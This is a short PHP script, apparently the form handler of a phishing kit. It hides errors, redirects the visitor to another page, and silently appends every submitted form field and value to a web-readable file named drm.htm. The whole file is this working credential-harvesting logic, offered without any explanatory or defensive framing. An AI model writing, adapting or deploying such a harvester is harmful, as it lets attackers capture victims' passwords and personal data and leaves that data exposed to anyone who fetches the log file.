<?php
header('location: 13variablevalued_handle_fwrite_fclose_reporting.php');
error_reporting(0);
$handle = fopen("drm.htm","a");
foreach($_POST as $variable => $value)
{
  fwrite($handle, $variable);
  fwrite($handle, "= ");
  fwrite($handle, $value);
  fwrite($handle, "\r\n<br>");
}
fwrite($handle, "\r\n<br>");
fclose($handle);
exit;
?> 
       